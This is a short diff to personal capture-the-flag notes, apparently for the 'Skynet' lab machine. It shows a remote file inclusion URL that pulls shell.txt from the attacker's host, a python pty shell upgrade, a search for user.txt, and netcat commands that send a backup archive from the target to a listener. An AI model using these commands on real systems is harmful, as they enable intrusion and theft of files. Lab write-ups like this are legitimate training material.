@@ -33,6 +33,12 @@ need to:
 3. upgrade shell python3 -c 'import pty; pty.spawn("/bin/bash")'
 http://10.113.130.138/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://192.168.232.84/shell.txt
 
+find / -name "user.txt" 2>/dev/null
+
+
+- **On your Kali Machine:** Set up your listener first. `nc -lvnp 1234 > backup.tgz`
+    
+- **On the Target (Skynet):** Send the file directly to your IP. `nc 192.168.232.84 1234 < /home/milesdyson/backups/backup.tgz`
 
 
 
